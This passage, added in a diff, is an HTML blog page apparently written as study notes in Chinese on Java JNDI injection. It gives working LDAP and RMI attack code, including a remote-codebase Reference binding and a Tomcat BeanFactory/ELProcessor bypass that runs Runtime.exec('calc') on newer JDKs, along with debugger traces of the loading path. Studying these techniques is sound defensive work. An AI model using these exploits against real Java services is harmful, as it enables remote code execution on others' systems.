+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+            config.setSchema(null);
+            config.setEnforceAttributeSyntaxCompliance(false);
+            config.setEnforceSingleStructuralObjectClass(false);
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            ds.add(&quot;dn: &quot; + &quot;dc=example,dc=com&quot;, &quot;objectClass: top&quot;, &quot;objectclass: domain&quot;);
+            ds.add(&quot;dn: &quot; + &quot;ou=employees,dc=example,dc=com&quot;, &quot;objectClass: organizationalUnit&quot;, &quot;objectClass: top&quot;);
+            ds.add(&quot;dn: &quot; + &quot;uid=longofo,ou=employees,dc=example,dc=com&quot;, &quot;objectClass: ExportObject&quot;);
+
+            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$
+            ds.startListening();
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>EXP（把恶意类放到服务端去）</p>
+<pre><code class="language-java">package org.example;
+import javax.naming.InitialContext;
+import javax.naming.Reference;
+
+public class LDAP_EXP {
+    public static void main(String[] args) throws Exception {
+        InitialContext initialContext =new InitialContext();
+        Reference reference =new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://localhost:8000/&quot;);
+        initialContext.rebind(&quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;,reference);
+    }
+}
+</code></pre>
+<p>客户端：</p>
+<pre><code class="language-java">package org.example;
+
+import javax.naming.InitialContext;
+
+public class LDAP_C {
+    public static void main(String[] args) throws Exception {
+        String string = &quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;;
+
+        InitialContext initialContext = new InitialContext();
+        initialContext.lookup(string);
+    }
+}
+</code></pre>
+<p>结果</p>
+<p>先开启python服务，然后打开LDAP服务端，然后在运行EXP把恶意类放上去，然后在运行客户端，成功实现类加载</p>
+<figure data-type="image" tabindex="41"><img src="https://bloyet.github.io/post-images/1749492629351.png" alt="" loading="lazy"></figure>
+<h3 id="流程分析-2">流程分析</h3>
+<p>整体和 RMI 很相似，我们断点依旧打在</p>
+<p>步入</p>
+<figure data-type="image" tabindex="42"><img src="https://bloyet.github.io/post-images/1749492629507.png" alt="" loading="lazy"></figure>
+<p>这里我们就不看getURLOrDefaultInitCtx(name)这一部分了，直接跟进lookup方法</p>
+<figure data-type="image" tabindex="43"><img src="https://bloyet.github.io/post-images/1749492629523.png" alt="" loading="lazy"></figure>
+<p>调用父类的lookup方法</p>
+<figure data-type="image" tabindex="44"><img src="https://bloyet.github.io/post-images/1749492629539.png" alt="" loading="lazy"></figure>
+<p>前面是一样获得LdapCtx 然后在调用lookup方法</p>
+<figure data-type="image" tabindex="45"><img src="https://bloyet.github.io/post-images/1749492629554.png" alt="" loading="lazy"></figure>
+<p>ldapCtx 本身是没有 lookup 方法，还是得调它的父类</p>
+<p>这里先跟进p_lookup方法</p>
+<figure data-type="image" tabindex="46"><img src="https://bloyet.github.io/post-images/1749492629570.png" alt="" loading="lazy"></figure>
+<p>然后又调用了c_lookup方法，跟进</p>
+<figure data-type="image" tabindex="47"><img src="https://bloyet.github.io/post-images/1749492629586.png" alt="" loading="lazy"></figure>
+<p>然后在调用getObjectInstance方法，跟进</p>
+<figure data-type="image" tabindex="48"><img src="https://bloyet.github.io/post-images/1749492629602.png" alt="" loading="lazy"></figure>
+<p>然后继续调用getObjectFactoryFromReference，跟进</p>
+<figure data-type="image" tabindex="49"><img src="https://bloyet.github.io/post-images/1749492629618.png" alt="" loading="lazy"></figure>
+<p>在这里进行加载字节码</p>
+<figure data-type="image" tabindex="50"><img src="https://bloyet.github.io/post-images/1749492629633.png" alt="" loading="lazy"></figure>
+<h1 id="jndi高版本怎么实现绕过">JNDI高版本怎么实现绕过</h1>
+<h2 id="源码对比">源码对比：</h2>
+<p>在低版本JDK_8u65下，在<code>RegistryContext#decodeObject()</code>方法会直接调用到<code>NamingManager#getObjectInstance()</code>，进而调用<code>getObjectFactoryFromReference()</code>方法来获取远程工厂类</p>
+<figure data-type="image" tabindex="51"><img src="https://bloyet.github.io/post-images/1749492629648.png" alt="" loading="lazy"></figure>
+<p>JDK_8u241</p>
+<figure data-type="image" tabindex="52"><img src="https://bloyet.github.io/post-images/1749492629664.png" alt="" loading="lazy"></figure>
+<p>增加了一层类型检查以及<code>trustURLCodebase</code>的检查。基本上远程 codebase 都不会被允许加载了，</p>
+<p>但是我们可以通过本地加载去绕过它，我觉得用本地解析 更准确。原理是服务器传递了一个客户端可以进行本地解析的类，然后客户端用已有的组件进行了解析，导致了RCE</p>
+<h2 id="绕过限制">绕过限制</h2>
+<p>该本地工厂类必须实现<code>javax.naming.spi.ObjectFactory</code>接口,因为在<code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code>最后的<code>return</code>语句对<code>Factory</code>类的实例对象进行了类型转换，并且该工厂类至少存在一个<code>getObjectInstance()</code>方法</p>
+<p><code>org.apache.naming.factory.BeanFactory</code>就是满足条件之一，并由于该类存在于Tomcat8依赖包中，攻击面和成功率还是比较高的。</p>
+<p><code>BeanFactory</code> 在 <code>getObjectInstance()</code>会通过参数指定进行类加载，如何这个类是可以进行命令执行的，那就能RCE了</p>
+<p>但是这里还有一个类型判断（是否为ResourceRef，是就可以进行类加载了），我们还得对它进行包装一下</p>
+<figure data-type="image" tabindex="53"><img src="https://bloyet.github.io/post-images/1749492629680.png" alt="" loading="lazy"></figure>
+<h2 id="复现">复现</h2>
+<p>环境：</p>
+<p>先导入对应的依赖</p>
+<pre><code class="language-java">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
+    &lt;version&gt;8.5.0&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+    &lt;artifactId&gt;tomcat-jasper-el&lt;/artifactId&gt;
+    &lt;version&gt;8.5.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>服务端：</p>
+<pre><code class="language-java">package org.example;
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import org.apache.naming.ResourceRef;
+import javax.naming.StringRefAddr;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMI_server_bypass {
+    public static void main(String[] args) throws Exception {
+        Registry registry = LocateRegistry.createRegistry(1099);
+        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);
+        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;faster=eval&quot;));
+        resourceRef.add(new StringRefAddr(&quot;faster&quot;, &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;));
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
+        registry.bind(&quot;Bloyet&quot;, referenceWrapper);
+        System.out.println(&quot;Registry运行中......&quot;);
+
+    }
+}
+</code></pre>
+<p>客户端</p>
+<pre><code class="language-java">package org.example;
+import javax.naming.Context;
+import javax.naming.InitialContext;
+
+public class JNDI {
+    public static void main(String[] args) throws Exception {
+
+        String string = &quot;rmi://localhost:1099/Bloyet&quot;;
+        //初始化上下文
+        Context context = new InitialContext();
+
+        //调用远程类
+        context.lookup(string);
+
+
+    }
+}
+</code></pre>
+<h2 id="流程分析-3">流程分析</h2>
+<p>断点打在：</p>
+<p>步入</p>
+<figure data-type="image" tabindex="54"><img src="https://bloyet.github.io/post-images/1749492629696.png" alt="" loading="lazy"></figure>
+<p>直接看lookup了，前面那个函数流程不变</p>
+<figure data-type="image" tabindex="55"><img src="https://bloyet.github.io/post-images/1749492629712.png" alt="" loading="lazy"></figure>
+<p>调用RegistryContext 的 lookup</p>
+<figure data-type="image" tabindex="56"><img src="https://bloyet.github.io/post-images/1749492629728.png" alt="" loading="lazy"></figure>
+<p>RMI 原生获取到字节码之后，调用decodeObject</p>
+<figure data-type="image" tabindex="57"><img src="https://bloyet.github.io/post-images/1749492629743.png" alt="" loading="lazy"></figure>
+<p>首先就是判断是否为RemoteReference类型，如果是就直接把我们要实例化的对象直接强制转换成RemoteReference类型，会导致后面的第二个if进去，导致加载失败</p>
+<p>调用NamingManager#getObjectInstance，跟进</p>
+<figure data-type="image" tabindex="58"><img src="https://bloyet.github.io/post-images/1749492629759.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="59"><img src="https://bloyet.github.io/post-images/1749492629775.png" alt="" loading="lazy"></figure>
+<p>通过getFactoryClassName 获取到工厂类的全类名，调用<code>getObjectFactoryFromReference</code>先对它进行类加载<br>
+然后开始调用工厂类的<code>getObjectInstance</code>对类实现实例化加载</p>
+<figure data-type="image" tabindex="60"><img src="https://bloyet.github.io/post-images/1749492629792.png" alt="" loading="lazy"></figure>
+<p>加载字节码，</p>
+<figure data-type="image" tabindex="61"><img src="https://bloyet.github.io/post-images/1749492629806.png" alt="" loading="lazy"></figure>
+<p>获取方法，调用invoke</p>
+<figure data-type="image" tabindex="62"><img src="https://bloyet.github.io/post-images/1749492629821.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="63"><img src="https://bloyet.github.io/post-images/1749492629837.png" alt="" loading="lazy"></figure>
+<p>总结：</p>
+<p>为了获取到 context 实例而去构造 factory 工厂类，然后通过 factory 去实例化 context，然后再去通过 context 去调用各种方法</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#jndi%E7%AE%80%E8%BF%B0">JNDI简述</a>
+<ul>
+<li><a href="#%E5%91%BD%E5%90%8D%E6%9C%8D%E5%8A%A1naming-server">命名服务（Naming Server）</a></li>
+<li><a href="#%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1directory-service">目录服务（Directory Service）</a></li>
+<li><a href="#jndi-spi">JNDI SPI</a></li>
+</ul>
+</li>
+<li><a href="#jndi%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B">JNDI代码示例</a>
+<ul>
+<li><a href="#jndirmi">JNDI+RMI</a>
+<ul>
+<li><a href="#rmi%E6%8E%A5%E5%8F%A3">RMI接口：</a></li>
+<li><a href="#rmi%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E7%B1%BB">RMI远程对象（实现类）</a></li>
+<li><a href="#rmi%E6%9C%8D%E5%8A%A1%E7%AB%AF">RMI服务端：</a></li>
+<li><a href="#%E5%AE%A2%E6%88%B7%E7%AB%AF">客户端：</a></li>
+</ul>
+</li>
+<li><a href="#jndi-dns">JNDI + DNS</a></li>
+</ul>
+</li>
+<li><a href="#jndi%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B">JNDI的工作流程</a></li>
+<li><a href="#jndi%E5%BA%95%E5%B1%82%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0">JNDI底层代码实现</a>
+<ul>
+<li><a href="#%E8%8E%B7%E5%8F%96%E5%B7%A5%E5%8E%82%E7%B1%BB">获取工厂类</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E4%BA%A4%E4%BA%92%E6%89%80%E9%9C%80%E8%B5%84%E6%BA%90">获取服务交互所需资源</a></li>
+</ul>
+</li>
+<li><a href="#jndi%E5%8A%A8%E6%80%81%E5%8D%8F%E8%AE%AE%E8%BD%AC%E6%8D%A2">JNDI动态协议转换</a></li>
+<li><a href="#jndi%E5%8A%A8%E6%80%81%E5%8D%8F%E8%AE%AE%E8%BD%AC%E6%8D%A2%E5%BA%95%E5%B1%82%E5%88%86%E6%9E%90">JNDI动态协议转换底层分析</a></li>
+<li><a href="#jndi-refernce-%E7%B1%BB">JNDI-Refernce 类</a></li>
+<li><a href="#jndi%E6%B3%A8%E5%85%A5">JNDI注入</a>
+<ul>
+<li><a href="#jndirmi-2">JNDI+RMI</a>
+<ul>
+<li><a href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">流程分析</a></li>
+</ul>
+</li>
+<li><a href="#jndildap">JNDI+LDAP</a>
+<ul>
+<li><a href="#ldap%E7%AE%80%E4%BB%8B">LDAP简介</a></li>
+<li><a href="#%E5%A4%8D%E7%8E%B0%E4%BB%A3%E7%A0%81">复现代码</a>
+<ul>
+<li><a href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">环境配置</a></li>
+<li><a href="#%E4%BB%A3%E7%A0%81">代码</a></li>
+</ul>
+</li>
+<li><a href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90-2">流程分析</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#jndi%E9%AB%98%E7%89%88%E6%9C%AC%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87">JNDI高版本怎么实现绕过</a>
+<ul>
+<li><a href="#%E6%BA%90%E7%A0%81%E5%AF%B9%E6%AF%94">源码对比：</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6">绕过限制</a></li>
+<li><a href="#%E5%A4%8D%E7%8E%B0">复现</a></li>
+<li><a href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90-3">流程分析</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://bloyet.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
